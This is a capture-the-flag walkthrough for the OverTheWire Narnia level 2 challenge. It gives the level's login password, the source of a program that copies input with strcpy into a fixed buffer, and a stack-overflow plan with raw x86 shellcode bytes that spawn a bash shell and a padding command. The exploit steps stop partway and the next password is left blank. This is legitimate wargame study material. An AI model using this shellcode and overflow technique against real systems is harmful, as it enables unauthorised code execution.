# Level 2 → Level 3

## Solution
```
ssh narnia2@narnia.labs.overthewire.org -p 2226
```
```
Zzb6MIyceT
```
```
cd /narnia ; ls -al
```
```
cat narnia2.c
```

The printed file is shown below:

```c
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

In the first few seconds I didn't understand what could be done here. But then I remembered [microcorruption](https://github.com/SimchaTeich/Microcorruption)! And in my opinion, shellcode should be implanted here to the top of the stack and overwrite the value back which is 128+4 bytes from the top of the stack (plus 4 because there is an EBP register). Therefore, the order of operations will be as follows:
* Inserting shellcode at the top of the stack
    * The same shellcode from the previous challenge that causes bash to run
* Padding the shellcode so that it is 124 bytes in size
* And next to that will come the address to the top of the stack
     * This will overwrite the address back from main
     * Don't forget little endian

Let's get started:
1. shellcode is:
    ```
    echo "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    ```

2. padding is: 
    ```
    perl -e 'print "A"x(128-33)'
    ```

## Password for the next level:
```

```
